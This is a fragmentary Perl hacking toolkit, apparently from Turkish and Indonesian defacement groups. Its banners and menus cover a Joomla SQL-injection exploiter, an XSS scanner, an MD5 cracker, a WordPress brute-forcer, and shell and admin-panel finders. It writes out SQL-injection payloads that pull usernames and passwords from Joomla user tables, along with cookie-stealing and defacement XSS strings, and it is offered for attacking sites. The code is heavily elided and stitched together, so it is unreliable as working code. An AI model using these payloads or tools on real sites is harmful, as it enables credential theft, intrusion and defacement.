...
system('cls');
system('title VOİXSEC.BLOGSPOT.COM');
print color("green"),"======================================================\n";
print color("green"),"                        VoiX \n";
print color("green"),"    [#]  VOİXSEC.BLOGSPOT.COM  [#]      \n"; 
print color("red"), "                   Coded by VOİX                  \n"; 
print color("green"), "======================================================\n";
...
print RED, q {
.___            .___                          .__        
|   | ____    __| _/____   ____   ____   _____|__|____   
|   |/    \  / __ |/  _ \ /    \_/ __ \ /  ___/  \__  \  
|   |   |  \/ /_/ (  <_> )   |  \  ___/ \___ \|  |/ __ \_
...
$target = $ARGV[0];
#Daftar vulnnya bisa ditambahin sendiri mas
@vuln = (
...
#Hapus aja pagernya kalo mau dipake semua
...
#,'+union+select+1,2,3,concat_ws(0x3a,username,password)indonesia,5,6,7,8,9,10,11+from+mos_users--'
#,'+union+select+1,2,3,concat_ws(0x3a,username,password)indonesia,5,6,7,8,9,10,11+from+jos_users--'
);
print GREEN, q(
 Joomla SQLi Exploiter
 Contact me at : gonerebootyourself<at>gmail.com
...
print "\t>                                                                  >\n";
print "\t>                        Coded by VOİXSEC.BLOGSPOT.COM                     >\n";
print "\t>       	 VOİX             >\n";
...
######
@XSS = ("MrTieDie",
"<center>Hacked by VOİX</center>",
"<center><marquee>Hacked by VOİX</marquee> </center>",
"<CeNTer>MrTieDie</CeNTer>",
"='><script>alert(document.cookie)</script>",
"&lt;script&gt;alert('Hacked BY VOİX');&lt;/script&gt",
"a?<script>alert('Hacked by VOİX')</script>",
"<SCRIPT>a=/Hacked by MrTieDie/alert(a.source)</SCRIPT>",
"%3Cscript%3Ealert('Hacked by VOİX')%3C/script%3E",
"<IMG SRC=javascript:alert(String.fromCharCode(56,56,44,56,51,44,56,51))>",
"<IMG SRC=javascript:alert('Hacked by VOİX')>",
"<SCRIPT>a=/MrTieDie/alert(a.source)</SCRIPT>",
...
if ( $URL =~ /VOİX/ || /HAcked/ || /BHG/ || /XSS/ || /cookie/  ) { $Message ="XSS Vulnerability FOUND";}
...
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ( $URL =~ /MrTieDie/ || /HAcked/ || /BHG/ || /XSS/ || /cookie/  ) { $Message ="Vulnaravel a XSS";}
else { $Message = "NOT FOUND XSS Vulnerability";}
print "$URL     =>    $Message\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>ALL.txt');
         ...
         \ \ /\ / /| |M) | | |E) | | | | |/ _` | |  _ \  | |   |  _ \ /__ \/ __| |/ /__ \  __|
          \ V  V / |  __/  |  __/| | |_| | (D| | | | | | | |___| | | |  __/ (I_|   |  K_/ |   
           \_/\_/  |_|     |_|   |_|\__,_|\__, |_|_| |_|  \____|_| |_|\___|\___|_|\_\___|_|   
                                          |___/                                               
';
print color "bold red";print "  Writed By : VoiX
  
  IeDb.Ir / Acc , SecTime.Ir
...
system('cls');
system('title Online Md5 Cracker Edited By VoiX');
print "\n\t***********************************\n"; 
print "\t*      Md5 Cracker Online         *\n"; 
print "\t*          ReC0ded by MrTieDie    *\n"; 
print "\t*          Edited By VoiX     *\n"; 
print "\t-      Menu  :                    -\n"; 
print "\t*          1 - md5 hash           *\n"; 
print "\t*          2 - md5.txt            *\n"; 
print "\t***********************************\n"; 
...
print "\n\t\n"; 
print "\t*Md5 Cracker Online\n";  
print "\t*ReCoded By VoiX\n"; 
print "\t*VOİXSEC.BLOGSPOT.COM\n"; 
print "\t*TURKİSH HACKER\n"; 
print  "\t\n\n";
&next;
} else { 
print "\nIt's not Md5! \n\nLook The Menu again!\n\n"; 
...
print q(
 Wordpress Bruteforce
 Contact me at : baddrea48<at>gmail.com
 Indonesian People Here!!
);
$target = 'http://' . $target;
}
...
print "Creator : VoiX\n";
print "Mail : voixsec@gmail.com\n";
print "Greetz : HENKERZ.ORG \n";
print "VOİX| \n";
system("pause");
}
if($targett eq '12')
...
print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                    FCK Editor Dir Tester                         >\n";
print "\t>                                                                  >\n";
print "\t>                     Created By MrTieDie                          >\n";
print "\t>       	SanjunganJiwa | JokerTeamChild                     >\n";
...
system('cls');
system('title Dir Finder Rec0ded by MrTieDie');
print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                      Shell Finder  WhiteCodeX                      >\n";
print "\t>                          C0ded by MrTieDie                        >\n";
print "\t>                     Greetz to ./Mr Error 404                      >\n";
print "\t>       	SanjunganJiwa Team | JokerTeamChild                 >\n";
...
system('cls');
system('title Admin Finder Rec0ded by MrTieDie');

print"\n";
print "--------------------------------------------------------\n" ;
print "[*]----------Admin Finder Rec0ded by MrTieDie--------[*]\n" ;
print "[*]-------------    ReCoded By MrTieDie    ----------[*]\n" ;
print "[*]------SanjunganJiwa Team | JokerTeamChild---------[*]\n" ;
print "[*]------------Gr33tz ddosser | Indonesian Hax0r-----[*]\n" ;
print "********************************************************\n" ;
print "\n";
